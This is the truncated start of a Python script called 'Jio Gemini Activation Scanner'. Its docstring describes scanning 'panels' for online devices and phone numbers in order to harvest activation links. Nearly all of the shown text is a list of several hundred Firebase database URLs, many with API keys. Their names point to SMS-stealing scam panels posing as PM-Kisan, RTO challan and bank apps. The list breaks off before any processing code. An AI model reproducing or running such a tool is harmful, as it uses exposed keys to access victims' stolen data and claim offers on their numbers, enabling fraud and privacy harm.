"""
Jio Gemini Activation Scanner
Flow: All Panels â†’ Online Devices â†’ Unique Numbers â†’ Then Process Links
Features:
- Check link VALID/USED/EXPIRED before saving (skip used links)
- Track processed numbers across runs (skip already-done numbers)
"""
from __future__ import annotations
import asyncio
import csv
import html
import json
import re
import time
from collections import Counter, defaultdict
from datetime import datetime, timezone, timedelta
from pathlib import Path
from typing import Any
from urllib.parse import unquote

import aiohttp
import requests


# ==================== ALL FIREBASE PANELS (NEWLY EXTRACTED) ====================
FIREBASE_PANELS = [
    ("https://rto9-d2b33-default-rtdb.firebaseio.com", "AIzaSyC5pP7ZRx9h_Puc3nvbQ7-O8zzxVPXnl54"),
    ("https://bandhan2-7jan-default-rtdb.firebaseio.com", "AIzaSyCYazDpCTtEh7ONnEIqdmwlnxDh4aIIptU"),
    ("https://randi-rona-81876-default-rtdb.firebaseio.com", "AIzaSyA-sImDO8a4vS802tNgHtNFXOAIAICg5Us"),
    ("https://pmsjdj-default-rtdb.firebaseio.com", "AIzaSyBujgYtAlcvZ62NDAPezL2cnlhn6IQ6fak"),
    ("https://maxa29-f652e-default-rtdb.firebaseio.com", "AIzaSyC9pFnZUbEqZTtKbV4u-4j0VvmRJksXmQA"),
    ("https://rnd12-17508-default-rtdb.firebaseio.com", "AIzaSyCebgvXxp2bKFFORHwHFaUJFjFnUPx7awE"),
    ("https://mun4-ff5d4-default-rtdb.firebaseio.com", "AIzaSyAi9a-fmwWg3ijYYYWW8y2LnFXP3oOduMM"),
    ("https://sanjee-9918a-default-rtdb.firebaseio.com", "AIzaSyC_7pBBqu9LYTi4BcXo_q7VUviWoL91V6c"),
    ("https://pohn-cd7ea-default-rtdb.firebaseio.com", "AIzaSyCebgvXxp2bKFFORHwHFaUJFjFnUPx7awE"),
    ("https://tillu-2-default-rtdb.firebaseio.com", "AIzaSyCmEW2zbIUFc2U69N1HnaRMRakymUN5zl8"),
    ("https://pm-kisan-22hg-default-rtdb.firebaseio.com", "AIzaSyCbT2cHC05tINJ3aOku1URGlAzWTG1IS1E"),
    ("https://pm110-fd2cd-default-rtdb.firebaseio.com", "AIzaSyBaRfrpgMT34W7PfayT5oJ0WheLSjEuFfs"),
    ("https://udaya-47819-default-rtdb.firebaseio.com", "AIzaSyATn6LDSqEYPCyY-yMKDhzVBO263WmYOqY"),
    ("https://pm32-28c24-default-rtdb.firebaseio.com", "AIzaSyCeNVrQ_EET8Fm-btr5rKVHMnzHOjdynAw"),
    ("https://pm-kishan-25-58b3c-default-rtdb.firebaseio.com", "AIzaSyA51lq8IG509h32yHtzaWWWzdyZNqemUkc"),
    ("https://biharnew2-default-rtdb.firebaseio.com", "AIzaSyCbT2cHC05tINJ3aOku1URGlAzWTG1IS1E"),
    ("https://panel-wala-v16-default-rtdb.firebaseio.com", ""),
    ("https://testingyou-2dcac-default-rtdb.firebaseio.com", ""),
    ("https://panel-wala-v27-default-rtdb.firebaseio.com", ""),
    ("https://stsfk30aug-default-rtdb.firebaseio.com", "AIzaSyDxLckcJTxaI1DHUNGnUZ_gCgodOB5zk54"),
    ("https://yono-sb41-default-rtdb.firebaseio.com", "AIzaSyDX9UHFGwO2bpImE2Hn2TtgIajvdjWS8Xg"),
    ("https://pm-kisan-15jg-default-rtdb.firebaseio.com", "AIzaSyCbT2cHC05tINJ3aOku1URGlAzWTG1IS1E"),
    ("https://human-34-kumar-default-rtdb.firebaseio.com", "AIzaSyAv9bt2f9zwmI7ua1Ce5PJ2xNvQyKDnYAA"),
    ("https://panel-wala-v28-default-rtdb.firebaseio.com", ""),
    ("https://raja252525raj-4ee9a-default-rtdb.firebaseio.com", "AIzaSyCp7YJATv2jsGuH0QHZ7n2RwNQIWhNU5mM"),
    ("https://salasali6990-1171d-default-rtdb.firebaseio.com", "AIzaSyCfzlvNg6vYgd69dcHB0dpf6H6Ipz_yZsY"),
    ("https://rahu80759-ac69b-default-rtdb.firebaseio.com", "AIzaSyCp7YJATv2jsGuH0QHZ7n2RwNQIWhNU5mM"),
    ("https://gggggg-979bd-default-rtdb.firebaseio.com", "AIzaSyAFtNtxRZMX2uBuISXhbCw2SS9n2gh5S4U"),
    ("https://apkdriod-f6fb9-default-rtdb.firebaseio.com", "AIzaSyBVDnh3vYAH9lnPnrrYGf1Vk7Rg030UE2A"),
    ("https://rantaishita-f7614-default-rtdb.firebaseio.com", "AIzaSyAXeDnVzCBt7e-l1x5hb-2GZJr7wifUPDQ"),
    ("https://rtx-c9-default-rtdb.asia-southeast1.firebasedatabase.app", "AIzaSyC0D_8y2VQ5rYqfPyr-anr67ewq1MskDZg"),
    ("https://rahkiu-1da83-default-rtdb.firebaseio.com", "AIzaSyBKV27Gm5t6Pddv3kCSdEZpTA31PQBkwdc"),
    ("https://raja-bhaiya-62-default-rtdb.firebaseio.com", "AIzaSyCvvQcRRv7I9ZitcxvwV18fYG823bGxpFE"),
    ("https://dhheee-b95dc-default-rtdb.firebaseio.com", "AIzaSyATn6LDSqEYPCyY-yMKDhzVBO263WmYOqY"),
    ("https://kituu36-58290-default-rtdb.firebaseio.com", "AIzaSyDvRWi_nefhdeY4ZXuEckH0bYi5HyOVGMI"),
    ("https://u24153206-5eef6-default-rtdb.firebaseio.com", "AIzaSyC8TUeylMvF-DPjOBgiwDupKmcEcsL8zZA"),
    ("https://u40179853-987df-default-rtdb.firebaseio.com", "AIzaSyC4sqGrrj3aKQmKEZI91g0VlyLsDP4mzNY"),
    ("https://r62710898-39a8e-default-rtdb.firebaseio.com", "AIzaSyDRoMLRjH14MwjTaYZNssGhp2aM3RWEl2Q"),
    ("https://u67583339-bf0c1-default-rtdb.firebaseio.com", "AIzaSyCcp6sUxChp4C4jd6GS067BENN_Xg_78EU"),
    ("https://u58325342-dffc0-default-rtdb.firebaseio.com", "AIzaSyC8TUeylMvF-DPjOBgiwDupKmcEcsL8zZA"),
    ("https://u72749819-fa563-default-rtdb.firebaseio.com", "AIzaSyC8TUeylMvF-DPjOBgiwDupKmcEcsL8zZA"),
    ("https://chhnuk05-3188e-default-rtdb.firebaseio.com", "AIzaSyC81TxnR7owtpS22XF0eKPghr59UtFkSfw"),
    ("https://rtochallan-8579d-default-rtdb.firebaseio.com", "AIzaSyBGMNNLoTe12Ubz8r8I62JZ9cqlcdPK2F4"),
    ("https://rtochallan8-default-rtdb.firebaseio.com", "AIzaSyCRw5p_pBC5O6Aq4vfraBwcB28uoyKDNTk"),
    ("https://pm-india-07y-gu-default-rtdb.firebaseio.com", "AIzaSyCbT2cHC05tINJ3aOku1URGlAzWTG1IS1E"),
    ("https://mahanivip-kituk10-default-rtdb.firebaseio.com", "AIzaSyC3QMwY6_cT_KPr7o43gtxwzNjxqSbO5oY"),
    ("https://pm-modi-27jff-default-rtdb.firebaseio.com", "AIzaSyC5l9wLzvEo8vPDryQM7BTWrEaMvNiB01Q"),
    ("https://rmx3511uuj-default-rtdb.firebaseio.com", "AIzaSyDONMhKYFo7Liml02q7gxE_oxUrauingYg"),
    ("https://pm-kishan-23gug-default-rtdb.firebaseio.com", "AIzaSyA51lq8IG509h32yHtzaWWWzdyZNqemUkc"),
    ("https://yourfirebase-default-rtdb.firebaseio.com", "AIzaSnB1cdgCf8hSGRjx7sKuzfsmMQ_a2Uk2NlQ"),
    ("https://godpanel-203f8-default-rtdb.asia-southeast1.firebasedatabase.app", "AIzaSyCs3AJDbOaOpNTmImjgF-n32I-AK7CYWMk"),
    ("https://pm-kisan-13gfh-default-rtdb.firebaseio.com", "AIzaSyA51lq8IG509h32yHtzaWWWzdyZNqemUkc"),
    ("https://s85138920-87594-default-rtdb.firebaseio.com", "AIzaSyC56Erj8glA0un0ZCJ0_-5kvvKiw2lLuyg"),
    ("https://ravi-23776-default-rtdb.firebaseio.com", "AIzaSyCbT2cHC05tINJ3aOku1URGlAzWTG1IS1E"),
    ("https://comeback-5b876-default-rtdb.firebaseio.com", "AIzaSyD-1Gvt2cmr0mv1xoK4V9vtjVMXyJVLAvg"),
    ("https://money-ace2c-default-rtdb.firebaseio.com", "AIzaSyA6iuCQxsY5W8tw-Hu0MF3ey0j3RSniOV8"),
    ("https://vecna-82db2-default-rtdb.firebaseio.com", "AIzaSyBcKb88YDDd9ffoDsH5EhiAJVw_ygY12pY"),
    ("https://pmnr1newad-default-rtdb.firebaseio.com", "AIzaSyDyeSMnF_Sb9oaPoUjvW4ERov6Lq7h9CNM"),
    ("https://jamtar7-95f77-default-rtdb.firebaseio.com", "AIzaSyBvx2a_aGVoH-tIA9GHE9SpsSep_nH3FS4"),
    ("https://fortydata-fee65-default-rtdb.firebaseio.com", "AIzaSyB8fQ43aCrhxNyBovFnQhVk04NEk-w22Zs"),
    ("https://rto-e-chall-4-default-rtdb.firebaseio.com", "AIzaSyC-U9fBwuK610sUjZ4UAwppaWzSGHv0Cfc"),
    ("https://rto3-53dc7-default-rtdb.firebaseio.com", "AIzaSyAlhszFlbcer7_k3qAqcUvonKWBIy1L6Uc"),
    ("https://challan-758d1-default-rtdb.asia-southeast1.firebasedatabase.app", "AIzaSyBXJdXWfTCC4tSqD0nYXUbXaSISKhtjnrc"),
    ("https://juhiishita786-67829-default-rtdb.firebaseio.com", "AIzaSyD74TOQXfWjYvfwDQ06U38xhdRUIVJ4Afs"),
    ("https://imdum-6e873-default-rtdb.firebaseio.com", "AIzaSyDwlB7sv1VxT48TF07WfRrJcB0VsNIx-vA"),
    ("https://customer03support-default-rtdb.firebaseio.com", "AIzaSyDmYAQsN4RvmlA5kPCtwHBQm6pF30CTSqg"),
    ("https://u75887828-b5a63-default-rtdb.firebaseio.com", "AIzaSyC8TUeylMvF-DPjOBgiwDupKmcEcsL8zZA"),
    ("https://panel123628-default-rtdb.firebaseio.com", "AIzaSyCdjsUK2gvAxr1Lj0zmWEiiHSzOjEBYxyE"),
    ("https://master89812-b77a6-default-rtdb.firebaseio.com", "AIzaSyD8dtVPCyRtNPCJ8m3I7qmuiJy1ZYNCOgs"),
    ("https://siwanikumar923420-2e01f-default-rtdb.firebaseio.com", "AIzaSyBUKtg-eoK5b5rt8tpLaQbiSSS-z0H8woM"),
    ("https://m90910540-a4e00-default-rtdb.firebaseio.com", "AIzaSyC_7pBBqu9LYTi4BcXo_q7VUviWoL91V6c"),
    ("https://rajkumar8822556644-407f5-default-rtdb.firebaseio.com", "AIzaSyD8dtVPCyRtNPCJ8m3I7qmuiJy1ZYNCOgs"),
    ("https://m05960864-6140e-default-rtdb.firebaseio.com", "AIzaSyBUKtg-eoK5b5rt8tpLaQbiSSS-z0H8woM"),
    ("https://chfjfj-c2857-default-rtdb.firebaseio.com", "AIzaSyCAD1dGu5emRyr5YpnmLvwqffaK78hjAFI"),
    ("https://ajna-20fc4-default-rtdb.firebaseio.com", "AIzaSyBvV-6_8EWagib0G3Y8Fku9m84wREi6qNw"),
    ("https://rahul-panel-default-rtdb.firebaseio.com", ""),
    ("https://sonu-panel-default-rtdb.firebaseio.com", ""),
    ("https://bihar-panel-default-rtdb.firebaseio.com", ""),
    ("https://rahulsms-default-rtdb.firebaseio.com", ""),
    ("https://challan5-default-rtdb.firebaseio.com", ""),
    ("https://rajesh-panel-default-rtdb.firebaseio.com", ""),
    ("https://santosh-new-default-rtdb.firebaseio.com", ""),
    ("https://ghost-panel-default-rtdb.firebaseio.com", ""),
    ("https://dharmesh-panel-default-rtdb.firebaseio.com", ""),
    ("https://chhota-default-rtdb.firebaseio.com", ""),
    ("https://raja-amit-default-rtdb.firebaseio.com", ""),
    ("https://chandan-new-default-rtdb.firebaseio.com", ""),
    ("https://mangal-panel-default-rtdb.firebaseio.com", ""),
    ("https://prithvi-panel-default-rtdb.firebaseio.com", ""),
    ("https://sonu-raja-default-rtdb.firebaseio.com", ""),
    ("https://kundan-panel-default-rtdb.firebaseio.com", ""),
    ("https://rajumehta-default-rtdb.firebaseio.com", ""),
    ("https://babu-panel-default-rtdb.firebaseio.com", ""),
    ("https://jigar-panel-default-rtdb.firebaseio.com", ""),
    ("https://cyber19-default-rtdb.firebaseio.com", ""),
    ("https://lord-bhai-default-rtdb.firebaseio.com", ""),
    ("https://panel86-default-rtdb.firebaseio.com", ""),
    ("https://bhai-king-default-rtdb.firebaseio.com", ""),
    ("https://hira-panel-default-rtdb.firebaseio.com", ""),
    ("https://vasu-panel-default-rtdb.firebaseio.com", ""),
    ("https://jam-panel-default-rtdb.firebaseio.com", ""),
    ("https://rox-panel-default-rtdb.firebaseio.com", ""),
    ("https://sex-panel-default-rtdb.firebaseio.com", ""),
    ("https://sux-panel-default-rtdb.firebaseio.com", ""),
    ("https://kala-panel-default-rtdb.firebaseio.com", ""),
    ("https://kalu-panel-default-rtdb.firebaseio.com", ""),
    ("https://lala-panel-default-rtdb.firebaseio.com", ""),
    ("https://raka-panel-default-rtdb.firebaseio.com", ""),
    ("https://tofu-panel-default-rtdb.firebaseio.com", ""),
    ("https://demon-panel-default-rtdb.firebaseio.com", ""),
    ("https://fear-panel-default-rtdb.firebaseio.com", ""),
    ("https://goal-panel-default-rtdb.firebaseio.com", ""),
    ("https://mod-sms-default-rtdb.firebaseio.com", ""),
    ("https://kyo-panel-default-rtdb.firebaseio.com", ""),
    ("https://lakh-panel-default-rtdb.firebaseio.com", ""),
    ("https://cr-panel-default-rtdb.firebaseio.com", ""),
    ("https://nd-panel-default-rtdb.firebaseio.com", ""),
    ("https://myrohit-default-rtdb.firebaseio.com", ""),
    ("https://new-shivam-default-rtdb.firebaseio.com", ""),
    ("https://sense-panel-default-rtdb.firebaseio.com", ""),
    ("https://car-panel-default-rtdb.firebaseio.com", ""),
    ("https://kundan-2-default-rtdb.firebaseio.com", ""),
    ("https://dudu-panel-default-rtdb.firebaseio.com", ""),
    ("https://fud-panel-default-rtdb.firebaseio.com", ""),
    ("https://janu-panel-default-rtdb.firebaseio.com", ""),
    ("https://raj-panel-default-rtdb.firebaseio.com", ""),
    ("https://pap-panel-default-rtdb.firebaseio.com", ""),
    ("https://dark-ankit-default-rtdb.firebaseio.com", ""),
    ("https://raj-panel-2-default-rtdb.firebaseio.com", ""),
    ("https://mamu-new-default-rtdb.firebaseio.com", ""),
    ("https://gandhi-panel-default-rtdb.firebaseio.com", ""),
    ("https://fud-pro-default-rtdb.firebaseio.com", ""),
    ("https://rto-17-default-rtdb.firebaseio.com", ""),
    ("https://rto-58-default-rtdb.firebaseio.com", ""),
    ("https://kalu-48-default-rtdb.firebaseio.com", ""),
    ("https://vijay-4-default-rtdb.firebaseio.com", ""),
    ("https://amit-56-default-rtdb.firebaseio.com", ""),
    ("https://rohan-3-default-rtdb.firebaseio.com", ""),
    ("https://shukla2-default-rtdb.firebaseio.com", ""),
    ("https://abhishek5-default-rtdb.firebaseio.com", ""),
    ("https://tinku55-default-rtdb.firebaseio.com", ""),
    ("https://shivam-24-default-rtdb.firebaseio.com", ""),
    ("https://carderpanel-default-rtdb.firebaseio.com", ""),
    ("https://mera53-default-rtdb.firebaseio.com", ""),
    ("https://rto-xx-default-rtdb.firebaseio.com", ""),
    ("https://pintu-admin-default-rtdb.firebaseio.com", ""),
    ("https://hdfcpanel-default-rtdb.firebaseio.com", ""),
    ("https://murga1-default-rtdb.firebaseio.com", ""),
    ("https://murga2-default-rtdb.firebaseio.com", ""),
    ("https://murga5-default-rtdb.firebaseio.com", ""),
    ("https://murga6-default-rtdb.firebaseio.com", ""),
    ("https://murga9-default-rtdb.firebaseio.com", ""),
    ("https://murga10-default-rtdb.firebaseio.com", ""),
    ("https://murga11-default-rtdb.firebaseio.com", ""),
    ("https://murga13-default-rtdb.firebaseio.com", ""),
    ("https://murga14-default-rtdb.firebaseio.com", ""),
    ("https://murga17-default-rtdb.firebaseio.com", ""),
    ("https://murga18-default-rtdb.firebaseio.com", ""),
    ("https://murga20-default-rtdb.firebaseio.com", ""),
    ("https://murga21-default-rtdb.firebaseio.com", ""),
    ("https://premium-12-default-rtdb.firebaseio.com", ""),
    ("https://rahul-786-default-rtdb.firebaseio.com", ""),
    ("https://rat-27-default-rtdb.firebaseio.com", ""),
    ("https://lund-admin-default-rtdb.firebaseio.com", ""),
    ("https://tinkuadmin-default-rtdb.firebaseio.com", ""),
    ("https://tannuadmin-default-rtdb.firebaseio.com", ""),
    ("https://punjab-panel-default-rtdb.firebaseio.com", ""),
    ("https://mafianew-default-rtdb.firebaseio.com", ""),
    ("https://adityapanel-default-rtdb.firebaseio.com", ""),
    ("https://ananya69-default-rtdb.firebaseio.com", ""),
    ("https://saket-2-default-rtdb.firebaseio.com", ""),
    ("https://samrat-4-default-rtdb.firebaseio.com", ""),
    ("https://rohit-105-default-rtdb.firebaseio.com", ""),
    ("https://rohit-162-default-rtdb.firebaseio.com", ""),
    ("https://rohit-163-default-rtdb.firebaseio.com", ""),
    ("https://rohan-149-default-rtdb.firebaseio.com", ""),
    ("https://rahul-158-default-rtdb.firebaseio.com", ""),
    ("https://rahul-131-default-rtdb.firebaseio.com", ""),
    ("https://rahul241-default-rtdb.firebaseio.com", ""),
    ("https://santosh-ka-default-rtdb.firebaseio.com", ""),
    ("https://rahulki-default-rtdb.firebaseio.com", ""),
    ("https://modibhai-default-rtdb.firebaseio.com", ""),
    ("https://amitka2-default-rtdb.firebaseio.com", ""),
    ("https://apna-ji-default-rtdb.firebaseio.com", ""),
    ("https://pintubro-default-rtdb.firebaseio.com", ""),
    ("https://bro-bhai-default-rtdb.firebaseio.com", ""),
    ("https://ramesh-admin-default-rtdb.firebaseio.com", ""),
    ("https://mamu-ji-default-rtdb.firebaseio.com", ""),
    ("https://karan-admin-default-rtdb.firebaseio.com", ""),
    ("https://rajvip-default-rtdb.firebaseio.com", ""),
    ("https://mohan-admin-default-rtdb.firebaseio.com", ""),
    ("https://kunalji-default-rtdb.firebaseio.com", ""),
    ("https://mohan-bhai-default-rtdb.firebaseio.com", ""),
    ("https://praveen-admin-default-rtdb.firebaseio.com", ""),
    ("https://mamu-135-default-rtdb.firebaseio.com", ""),
    ("https://alipanel-default-rtdb.firebaseio.com", ""),
    ("https://randi-ji-default-rtdb.firebaseio.com", ""),
    ("https://admin-bhai-default-rtdb.firebaseio.com", ""),
    ("https://jhaant-default-rtdb.firebaseio.com", ""),
    ("https://amit-566-default-rtdb.firebaseio.com", ""),
    ("https://kutta44-default-rtdb.firebaseio.com", ""),
    ("https://patel-bhai-default-rtdb.firebaseio.com", ""),
    ("https://rani15-default-rtdb.firebaseio.com", ""),
    ("https://rani-admin-default-rtdb.firebaseio.com", ""),
    ("https://rani-ji-default-rtdb.firebaseio.com", ""),
    ("https://meenaji-default-rtdb.firebaseio.com", ""),
    ("https://chandan-ka-default-rtdb.firebaseio.com", ""),
    ("https://harshit-bhai-default-rtdb.firebaseio.com", ""),
    ("https://anshpanel-default-rtdb.firebaseio.com", ""),
    ("https://krish-10-default-rtdb.firebaseio.com", ""),
    ("https://balram-ji-default-rtdb.firebaseio.com", ""),
    ("https://rajeev-2-default-rtdb.firebaseio.com", ""),
    ("https://kuldeep-admin-default-rtdb.firebaseio.com", ""),
    ("https://pritam-panel-default-rtdb.firebaseio.com", ""),
    ("https://kalu-admin-default-rtdb.firebaseio.com", ""),
    ("https://bihari-4-default-rtdb.firebaseio.com", ""),
    ("https://bholaadmin-default-rtdb.firebaseio.com", ""),
    ("https://bajrang-bhai-default-rtdb.firebaseio.com", ""),
    ("https://kanhaiya-admin-default-rtdb.firebaseio.com", ""),
    ("https://bihari25-default-rtdb.firebaseio.com", ""),
    ("https://bihari-3-default-rtdb.firebaseio.com", ""),
    ("https://bihari2-default-rtdb.firebaseio.com", ""),
    ("https://bihari-admin-default-rtdb.firebaseio.com", ""),
    ("https://bajrangi58-default-rtdb.firebaseio.com", ""),
    ("https://bholababa-default-rtdb.firebaseio.com", ""),
    ("https://nepali-admin-default-rtdb.firebaseio.com", ""),
    ("https://arvind90-default-rtdb.firebaseio.com", ""),
    ("https://ronakadmin-default-rtdb.firebaseio.com", ""),
    ("https://shakti-9-default-rtdb.firebaseio.com", ""),
    ("https://amar-ji-default-rtdb.firebaseio.com", ""),
    ("https://ranjan-admin-default-rtdb.firebaseio.com", ""),
    ("https://naitik-panel-default-rtdb.firebaseio.com", ""),
    ("https://vansh-7-default-rtdb.firebaseio.com", ""),
    ("https://sadhuji-default-rtdb.firebaseio.com", ""),
    ("https://khiladi07-default-rtdb.firebaseio.com", ""),
    ("https://dildarji-default-rtdb.firebaseio.com", ""),
    ("https://rahuljio-default-rtdb.firebaseio.com", ""),
    ("https://manojraj-default-rtdb.firebaseio.com", ""),
    ("https://panel-india-default-rtdb.firebaseio.com", ""),
    ("https://raj-admin-10-default-rtdb.firebaseio.com", ""),
    ("https://raj-admin-34-default-rtdb.firebaseio.com", ""),
    ("https://rajiv-ji-default-rtdb.firebaseio.com", ""),
    ("https://ramu-admin-default-rtdb.firebaseio.com", ""),
    ("https://ravi-web-default-rtdb.firebaseio.com", ""),
    ("https://ajay-babu-default-rtdb.firebaseio.com", ""),
    ("https://raj-bhai-2-default-rtdb.firebaseio.com", ""),
    ("https://amit-ka-7-default-rtdb.firebaseio.com", ""),
    ("https://amit-ka3-default-rtdb.firebaseio.com", ""),
    ("https://rajeshadmin2-default-rtdb.firebaseio.com", ""),
    ("https://rajuadmin1-default-rtdb.firebaseio.com", ""),
    ("https://amit-ka52-default-rtdb.firebaseio.com", ""),
    ("https://amit-ka-71-default-rtdb.firebaseio.com", ""),
    ("https://raj-admin-33-default-rtdb.firebaseio.com", ""),
    ("https://amit-ka-103-default-rtdb.firebaseio.com", ""),
    ("https://amit-ka-106-default-rtdb.firebaseio.com", ""),
    ("https://amit-ka-160-default-rtdb.firebaseio.com", ""),
    ("https://ankit-2panel-default-rtdb.firebaseio.com", ""),
    ("https://raj-bhai-panel-default-rtdb.firebaseio.com", ""),
    ("https://thandai-panel-default-rtdb.firebaseio.com", ""),
    ("https://rcb-panel-default-rtdb.firebaseio.com", ""),
    ("https://kbcbhai-default-rtdb.firebaseio.com", ""),
    ("https://chandaadmin-default-rtdb.firebaseio.com", ""),
    ("https://kalapanel-default-rtdb.firebaseio.com", ""),
    ("https://kundan-admin-default-rtdb.firebaseio.com", ""),
    ("https://kundan-ka-default-rtdb.firebaseio.com", ""),
    ("https://comeback-panel-default-rtdb.firebaseio.com", ""),
    ("https://kajal-admin-default-rtdb.firebaseio.com", ""),
    ("https://amit-ka-panel-default-rtdb.firebaseio.com", ""),
    ("https://rohit-admin-default-rtdb.firebaseio.com", ""),
    ("https://chuha-1-default-rtdb.firebaseio.com", ""),
    ("https://panel-raj-default-rtdb.firebaseio.com", ""),
    ("https://gur-admin-default-rtdb.firebaseio.com", ""),
    ("https://mara-admin-default-rtdb.firebaseio.com", ""),
    ("https://chori-admin-default-rtdb.firebaseio.com", ""),
    ("https://biru-admin-default-rtdb.firebaseio.com", ""),
    ("https://pila-admin-default-rtdb.firebaseio.com", ""),
    ("https://rupa-admin-default-rtdb.firebaseio.com", ""),
    ("https://roya-admin-default-rtdb.firebaseio.com", ""),
    ("https://leraadmin-default-rtdb.firebaseio.com", ""),
    ("https://thanuadmin-default-rtdb.firebaseio.com", ""),
    ("https://manisha-admin-default-rtdb.firebaseio.com", ""),
    ("https://sacho-admin-default-rtdb.firebaseio.com", ""),
    ("https://upi-admin-default-rtdb.firebaseio.com", ""),
    ("https://sacho1-default-rtdb.firebaseio.com", ""),
    ("https://munda-admin-default-rtdb.firebaseio.com", ""),
    ("https://billu-admin-default-rtdb.firebaseio.com", ""),
    ("https://londa-admin-default-rtdb.firebaseio.com", ""),
    ("https://sintuadmin-default-rtdb.firebaseio.com", ""),
    ("https://nayapanel-default-rtdb.firebaseio.com", ""),
    ("https://sumani-admin-default-rtdb.firebaseio.com", ""),
    ("https://gur-admin-100-default-rtdb.firebaseio.com", ""),
    ("https://pradhan-ji-default-rtdb.firebaseio.com", ""),
    ("https://hehepanel-default-rtdb.firebaseio.com", ""),
    ("https://macpanel-default-rtdb.firebaseio.com", ""),
    ("https://yellopanel-default-rtdb.firebaseio.com", ""),
    ("https://yelloadmin-default-rtdb.firebaseio.com", ""),
    ("https://lakkiadmin-default-rtdb.firebaseio.com", ""),
    ("https://nikki-panel-default-rtdb.firebaseio.com", ""),
    ("https://yello10-default-rtdb.firebaseio.com", ""),
    ("https://yello12-default-rtdb.firebaseio.com", ""),
    ("https://ganda-panel-default-rtdb.firebaseio.com", ""),
    ("https://badalji-default-rtdb.firebaseio.com", ""),
    ("https://santu-bhai-default-rtdb.firebaseio.com", ""),
    ("https://randi-wala-default-rtdb.firebaseio.com", ""),
    ("https://pinku-ji-default-rtdb.firebaseio.com", ""),
    ("https://rajajiadmin-default-rtdb.firebaseio.com", ""),
    ("https://rich-panels-default-rtdb.firebaseio.com", ""),
    ("https://santu-panel-default-rtdb.firebaseio.com", ""),
    ("https://doublebhai-default-rtdb.firebaseio.com", ""),
    ("https://hex-123-default-rtdb.firebaseio.com", ""),
    ("https://kkk-admin-default-rtdb.firebaseio.com", ""),
    ("https://lkd-admin-default-rtdb.firebaseio.com", ""),
    ("https://nyapanel-default-rtdb.firebaseio.com", ""),
    ("https://pvt-panel-default-rtdb.firebaseio.com", ""),
    ("https://rkdadmin-default-rtdb.firebaseio.com", ""),
    ("https://rrt-admin-default-rtdb.firebaseio.com", ""),
    ("https://ambani-1-default-rtdb.firebaseio.com", ""),
    ("https://sakshi-4-default-rtdb.firebaseio.com", ""),
    ("https://mahadevadmin-default-rtdb.firebaseio.com", ""),
    ("https://mata-rani-ji-default-rtdb.firebaseio.com", ""),
    ("https://gupta-2-default-rtdb.firebaseio.com", ""),
    ("https://munda11-default-rtdb.firebaseio.com", ""),
    ("https://nundiadmin-default-rtdb.firebaseio.com", ""),
    ("https://modipanel-default-rtdb.firebaseio.com", ""),
    ("https://sajan-admin-default-rtdb.firebaseio.com", ""),
    ("https://mukhiya-ji-default-rtdb.firebaseio.com", ""),
    ("https://nehru-ji-default-rtdb.firebaseio.com", ""),
    ("https://yello13-default-rtdb.firebaseio.com", ""),
    ("https://pmawasnew-default-rtdb.firebaseio.com", ""),
    ("https://kalampanel-default-rtdb.firebaseio.com", ""),
    ("https://lalu786-default-rtdb.firebaseio.com", ""),
    ("https://rani17-default-rtdb.firebaseio.com", ""),
    ("https://dhoni-ji-default-rtdb.firebaseio.com", ""),
    ("https://raja-bhaiya-64-default-rtdb.firebaseio.com", ""),
    ("https://chandan-ka-118-default-rtdb.firebaseio.com", ""),
    ("https://raj-admin-panel-default-rtdb.firebaseio.com", ""),
    ("https://raj-panel-admin-default-rtdb.firebaseio.com", ""),
    ("https://sk-admin-06-default-rtdb.firebaseio.com", ""),
    ("https://sk-admin-15-default-rtdb.firebaseio.com", ""),
    ("https://sk-admin-16-default-rtdb.firebaseio.com", ""),
    ("https://sk-admin-17-default-rtdb.firebaseio.com", ""),
    ("https://sk-admin-21-default-rtdb.firebaseio.com", ""),
    ("https://sk-admin-22-default-rtdb.firebaseio.com", ""),
    ("https://sk-admin-23-default-rtdb.firebaseio.com", ""),
    ("https://adpanel37-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-2-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-3-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-04-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-05-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-06-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-07-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-08-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-09-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-10-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-11-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-12-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-13-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-14-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-16-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-17-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-18-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-19-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-20-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-21-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-122-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-123-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-126-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-127-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-128-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-129-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-130-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-230-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-231-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-232-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-260-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-261-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-262-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-263-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-420-default-rtdb.firebaseio.com", ""),
    ("https://ck-admin-421-default-rtdb.firebaseio.com", ""),
    ("https://hmm-bhai-default-rtdb.firebaseio.com", ""),
    ("https://kd-panel-default-rtdb.firebaseio.com", ""),
    ("https://bigbosspanel-default-rtdb.firebaseio.com", ""),
    ("https://my-admin-02-default-rtdb.firebaseio.com", ""),
    ("https://my-admin-03-default-rtdb.firebaseio.com", ""),
    ("https://my-admin-05-default-rtdb.firebaseio.com", ""),
    ("https://my-admin-06-default-rtdb.firebaseio.com", ""),
